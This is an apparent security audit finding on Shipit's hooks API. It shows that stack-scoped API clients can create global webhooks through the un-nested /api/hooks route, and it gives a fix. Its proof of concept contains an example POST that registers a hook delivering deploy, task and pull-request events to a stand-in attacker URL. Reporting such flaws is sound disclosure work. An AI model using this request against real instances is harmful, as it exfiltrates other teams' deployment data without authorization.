### Title
API client `stack_id` scope is not enforced on the un-nested `/api/hooks` endpoint, allowing creation of global webhook subscriptions - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
An `ApiClient` can be restricted to a single `Stack` via its `stack_id` attribute, and `Api::BaseController#stacks`/`#stack` enforce this restriction for every stack-scoped resource. `Api::HooksController`, however, is reachable through both a stack-nested route and a top-level, non-nested route (`resources :hooks` at `config/routes.rb`). On the top-level route the controller silently treats the hook as "global" instead of applying the client's stack restriction, letting a stack-scoped client with the `write:hook` permission create a hook that receives events from every stack in the instance.

### Finding Description
`ApiClient#stack_id?` is meant to bind a client's authority to one stack: `Api::BaseController#stacks` returns `Stack.where(id: current_api_client.stack_id)` when the client is scoped, and `#stack` resolves from that restricted relation: [1](#0-0) 

`Api::HooksController` computes the hook's target stack independently of this restriction:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [2](#0-1) 

The route table exposes `Api::HooksController#create`/`#update`/`#destroy` both nested under a stack (`scope '/stacks/*stack_id' ... resources :hooks`) and as a standalone top-level resource (`resources :hooks, only: %i[index create show update destroy]`): [3](#0-2) 

The engine's own test suite confirms the top-level route takes priority and that omitting `stack_id` yields a "global" hook, deliberately bypassing per-stack scoping: [4](#0-3) 

The only gate on `create`/`update`/`destroy` is the coarse `write:hook` permission check, not the client's `stack_id` binding: [5](#0-4) 

A global `Hook` (`stack_id: nil`) is delivered for every stack's events, per `Hook.for_stack`:
```ruby
scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }
``` [6](#0-5) 

and `Hook.deliver` fans out the payload (which includes deploy/rollback/task/pull_request/commit_status data) to every listening hook's `delivery_url`, using an HMAC computed from the hook's own `secret`, over which the attacker has full control since they created the hook: [7](#0-6) [8](#0-7) 

The binding that is broken is: **the stack a token is authorized for (`ApiClient.stack_id`) ≠ the stack(s) whose events the created hook actually touches** (all stacks, via `stack_id: nil`).

### Impact Explanation
An `ApiClient` created with a narrow scope (`stack_id` set to one stack) and only the `write:hook` permission — intended to let, e.g., a single team manage notifications for their own stack — can instead register a hook that receives `deploy`, `rollback`, `task`, `merge`, `pull_request`, `commit_status`, and `lock` events for **every stack** managed by the Shipit instance, exfiltrating this data to an attacker-controlled `delivery_url`. This is a cross-repository/cross-stack information exposure enabled by an authorization boundary (the token's stack scope) that the hooks endpoint fails to honor, which maps to the report's "Critical: cross-repository writes"/"High: unauthenticated read of stack state, task streams, or deploy output" categories.

### Likelihood Explanation
Exploitation only requires possession of a legitimately-issued, stack-scoped `ApiClient` token with `write:hook` permission (no additional privileges, no session, no GitHub credentials) and a single unauthenticated POST to `/api/hooks` instead of `/api/stacks/:stack_id/hooks`. The engine's own test suite documents and exercises this exact route-priority/global-hook behavior, indicating it is a stable, easily discoverable code path rather than a fragile edge case.

### Recommendation
In `Api::HooksController`, reject `create`/`update`/`destroy` (and scope `index`/`show`) to global hooks (`stack_id: nil`) whenever `current_api_client.stack_id?` is true; only an unscoped (`UnlimitedApiClient` or client with `stack_id` nil) should be permitted to manage global hooks. Concretely, `stack_id` resolution should raise/forbid when `params[:stack_id]` is blank but `current_api_client.stack_id?` is true, instead of silently falling back to `nil`.

### Proof of Concept
1. Create a stack-scoped `ApiClient` for `Stack A` with permission `write:hook` (e.g. fixture `here_come_the_walrus`, which is scoped per `test/controllers/api/stacks_controller_test.rb` behavior showing scoped clients only see their own stack via `/api/stacks`).
2. Authenticate as that client and call:
   ```
   POST /api/hooks
   { "delivery_url": "https://attacker.example/collect", "events": ["deploy", "task", "pull_request"] }
   ```
   Since `params[:stack_id]` is absent, `Api::HooksController#stack_id` returns `nil`, and the created `Hook` has `stack_id: nil` — a global hook, as confirmed by `test/controllers/api/hooks_controller_test.rb`'s `"#index without a stack_id returns the list of global hooks"` test.
3. Any subsequent `deploy`, `task`, or `pull_request` event on any stack in the instance (not just Stack A) will be delivered to `https://attacker.example/collect`, per `Hook.for_stack`/`Hook.deliver`.
